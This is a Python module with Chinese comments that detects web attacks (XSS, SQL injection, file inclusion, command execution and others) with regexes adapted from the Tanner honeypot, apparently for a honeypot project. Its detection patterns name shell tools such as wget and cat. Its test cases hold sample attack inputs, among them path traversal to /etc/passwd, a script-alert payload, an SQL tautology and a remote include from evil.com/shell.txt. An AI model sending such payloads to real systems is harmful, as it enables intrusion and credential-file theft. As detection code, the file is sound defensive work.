"""
攻擊偵測模組
複製自 Tanner 的攻擊偵測邏輯，用於識別各種網路攻擊類型
"""

import re
import logging

logger = logging.getLogger(__name__)


class AttackPatterns:
    """
    Tanner 攻擊偵測正則表達式模式
    來源: tanner/utils/patterns.py
    """

    # 基本頁面模式
    INDEX = re.compile(r"(/index.html|/)")
    WORD_PRESS_CONTENT = re.compile(r"/wp-content/.*")

    # ========================================================================
    # 攻擊模式 - Order 3 (最高優先級)
    # ========================================================================

    # XSS (跨站腳本攻擊)
    XSS_ATTACK = re.compile(r".*<(.|\n)*?>")

    # Command Execution (命令執行)
    CMD_ATTACK = re.compile(
        r".*[^A-z:./]"
        r"(alias|cat|cd|cp|echo|exec|find|for|grep|ifconfig|ls|man|mkdir|netstat|ping|ps|pwd|uname|wget|touch|while)"
        r"([^A-z:./]|\b)"
    )

    # ========================================================================
    # 攻擊模式 - Order 2
    # ========================================================================

    # LFI (本地檔案包含)
    LFI_ATTACK = re.compile(r".*(/\.\.)*(home|proc|usr|etc)/.*")

    # RFI (遠端檔案包含)
    RFI_ATTACK = re.compile(r".*((http(s){0,1}|ftp(s){0,1}):).*", re.IGNORECASE)

    # PHP Code Injection (PHP 程式碼注入)
    PHP_CODE_INJECTION = re.compile(r".*(;)*(echo|system|print|phpinfo)(\(.*\)).*")

    # PHP Object Injection (PHP 物件注入)
    PHP_OBJECT_INJECTION = re.compile(r"(^|;|{|})O:[0-9]+:")

    # CRLF Injection
    CRLF_ATTACK = re.compile(r".*(\r\n).*")

    # XXE Injection (XML 外部實體注入)
    XXE_INJECTION = re.compile(r".*<(\?xml|(!DOCTYPE.*)).*>")

    # Template Injection (模板注入)
    TEMPLATE_INJECTION_MAKO = re.compile(r".*(<%.*|\s%>).*")
    TEMPLATE_INJECTION_TORNADO = re.compile(r".*({{.*}}).*")

    # SQLi 相關模式 (簡化版，Tanner 使用 libinjection)
    SQLI_KEYWORDS = re.compile(
        r".*(union|select|insert|update|delete|drop|create|alter|exec|declare|cast|concat).*",
        re.IGNORECASE
    )
    SQLI_CHARS = re.compile(r".*['\";].*")  # SQL 特殊字元


class AttackDetector:
    """
    攻擊偵測器
    根據 Tanner 的邏輯偵測各種網路攻擊類型
    """

    def __init__(self):
        self.patterns = AttackPatterns()
        logger.info("AttackDetector initialized with Tanner patterns")

    def detect_attacks(self, path, headers=None, post_data=None, cookies=None):
        """
        偵測請求中的所有攻擊類型

        Args:
            path (str): 請求路徑 (包含 query string)
            headers (dict): HTTP headers
            post_data (str): POST 資料
            cookies (dict): Cookies

        Returns:
            list: 偵測到的攻擊類型列表，按優先級排序
        """
        detections = []

        # 檢查 URL 路徑中的攻擊
        if path:
            path_detections = self._scan_value(path)
            detections.extend(path_detections)

        # 檢查 POST 資料
        if post_data:
            post_detections = self._scan_value(post_data)
            detections.extend(post_detections)

        # 檢查 User-Agent (常見的攻擊向量)
        if headers and 'user-agent' in headers:
            ua_detections = self._scan_value(headers['user-agent'])
            detections.extend(ua_detections)

        # 檢查 Cookies (針對 SQLi 和 PHP Object Injection)
        if cookies:
            for cookie_value in cookies.values():
                if cookie_value:
                    cookie_detections = self._scan_cookie(str(cookie_value))
                    detections.extend(cookie_detections)

        # 去重並排序（按優先級）
        unique_detections = self._deduplicate_and_sort(detections)

        return unique_detections

    def _scan_value(self, value):
        """
        掃描單一值，檢查所有攻擊模式

        Args:
            value (str): 要檢查的值

        Returns:
            list: 偵測結果列表 [{"name": "attack_type", "order": priority}]
        """
        if not value:
            return []

        detections = []

        # Order 3 - 最高優先級
        if self.patterns.XSS_ATTACK.match(value):
            detections.append({"name": "xss", "order": 3})

        if self.patterns.CMD_ATTACK.match(value):
            detections.append({"name": "cmd_exec", "order": 3})

        # Order 2
        if self.patterns.LFI_ATTACK.match(value):
            detections.append({"name": "lfi", "order": 2})

        if self.patterns.RFI_ATTACK.match(value):
            detections.append({"name": "rfi", "order": 2})

        if self.patterns.PHP_CODE_INJECTION.match(value):
            detections.append({"name": "php_code_injection", "order": 2})

        if self.patterns.PHP_OBJECT_INJECTION.match(value):
            detections.append({"name": "php_object_injection", "order": 2})

        if self.patterns.CRLF_ATTACK.match(value):
            detections.append({"name": "crlf", "order": 2})

        if self.patterns.XXE_INJECTION.match(value):
            detections.append({"name": "xxe_injection", "order": 2})

        if self.patterns.TEMPLATE_INJECTION_MAKO.match(value) or \
           self.patterns.TEMPLATE_INJECTION_TORNADO.match(value):
            detections.append({"name": "template_injection", "order": 2})

        # SQLi 偵測 (簡化版)
        if self._detect_sqli(value):
            detections.append({"name": "sqli", "order": 2})

        return detections

    def _scan_cookie(self, value):
        """
        掃描 Cookie 值 (只檢查特定攻擊類型)

        Args:
            value (str): Cookie 值

        Returns:
            list: 偵測結果列表
        """
        detections = []

        # Cookie 主要檢查 SQLi 和 PHP Object Injection
        if self._detect_sqli(value):
            detections.append({"name": "sqli", "order": 2})

        if self.patterns.PHP_OBJECT_INJECTION.match(value):
            detections.append({"name": "php_object_injection", "order": 2})

        return detections

    def _detect_sqli(self, value):
        """
        SQLi 偵測 (簡化版)

        注意: Tanner 使用 pylibinjection 函式庫進行更準確的偵測
        這裡使用簡化的正則表達式版本

        Args:
            value (str): 要檢查的值

        Returns:
            bool: 是否偵測到 SQLi
        """
        if not value:
            return False

        # 檢查 SQL 關鍵字
        if self.patterns.SQLI_KEYWORDS.match(value):
            return True

        # 檢查 SQL 特殊字元（單引號、雙引號、分號）
        # 需要排除正常使用場景
        if self.patterns.SQLI_CHARS.match(value):
            # 進一步檢查是否真的像 SQL 注入
            # 例如：包含引號 AND 包含 SQL 關鍵字或特殊組合
            value_lower = value.lower()
            sql_indicators = [
                "or ", "and ", "union", "select", "insert", "update", "delete",
                "--", "/*", "*/", "@@", "char(", "concat(", "0x"
            ]
            if any(indicator in value_lower for indicator in sql_indicators):
                return True

        return False

    def _deduplicate_and_sort(self, detections):
        """
        去重並按優先級排序

        Args:
            detections (list): 偵測結果列表

        Returns:
            list: 去重並排序後的攻擊類型名稱列表
        """
        if not detections:
            return []

        # 建立字典以去重，保留最高 order
        attack_dict = {}
        for detection in detections:
            name = detection["name"]
            order = detection["order"]
            if name not in attack_dict or attack_dict[name] < order:
                attack_dict[name] = order

        # 按 order 排序 (高到低)
        sorted_attacks = sorted(attack_dict.items(), key=lambda x: x[1], reverse=True)

        # 只返回攻擊名稱
        return [name for name, _ in sorted_attacks]

    def get_primary_attack(self, path, headers=None, post_data=None, cookies=None):
        """
        取得優先級最高的攻擊類型

        Args:
            path (str): 請求路徑
            headers (dict): HTTP headers
            post_data (str): POST 資料
            cookies (dict): Cookies

        Returns:
            str: 優先級最高的攻擊類型，如果沒有攻擊則返回 "unknown"
        """
        attacks = self.detect_attacks(path, headers, post_data, cookies)

        if attacks:
            return attacks[0]  # 第一個就是優先級最高的
        else:
            # 檢查是否為基本頁面
            if self.patterns.INDEX.match(path):
                return "index"
            elif self.patterns.WORD_PRESS_CONTENT.match(path):
                return "wp-content"
            else:
                return "unknown"


# 便利函數
def detect_attack_types(path, headers=None, post_data=None, cookies=None):
    """
    便利函數：偵測攻擊類型

    Args:
        path (str): 請求路徑
        headers (dict): HTTP headers
        post_data (str): POST 資料
        cookies (dict): Cookies

    Returns:
        list: 攻擊類型列表
    """
    detector = AttackDetector()
    return detector.detect_attacks(path, headers, post_data, cookies)


# 測試用例
if __name__ == "__main__":
    # 設定日誌
    logging.basicConfig(level=logging.INFO)

    detector = AttackDetector()

    # 測試案例
    test_cases = [
        {
            "name": "LFI Attack",
            "path": "/?file=../../../../etc/passwd",
            "expected": ["lfi"]
        },
        {
            "name": "SQL Injection",
            "path": "/?id=1' OR '1'='1",
            "expected": ["sqli"]
        },
        {
            "name": "XSS Attack",
            "path": "/?name=<script>alert(1)</script>",
            "expected": ["xss"]
        },
        {
            "name": "RFI Attack",
            "path": "/?page=http://evil.com/shell.txt",
            "expected": ["rfi"]
        },
        {
            "name": "Command Execution",
            "path": "/?cmd=cat /etc/passwd",
            "expected": ["cmd_exec"]
        },
        {
            "name": "Multiple Attacks (XSS + LFI)",
            "path": "/?file=<script>alert(1)</script>../../etc/passwd",
            "expected": ["xss", "lfi"]  # XSS 優先級較高
        },
        {
            "name": "Normal Request",
            "path": "/index.html",
            "expected": []
        }
    ]

    print("=" * 80)
    print("攻擊偵測測試")
    print("=" * 80)

    for test in test_cases:
        print(f"\n測試: {test['name']}")
        print(f"路徑: {test['path']}")

        detected = detector.detect_attacks(test['path'])
        primary = detector.get_primary_attack(test['path'])

        print(f"偵測結果: {detected}")
        print(f"主要攻擊: {primary}")
        print(f"預期結果: {test['expected']}")

        # 簡單驗證
        if detected == test['expected'] or (not detected and not test['expected']):
            print("✅ 通過")
        else:
            print("❌ 失敗")
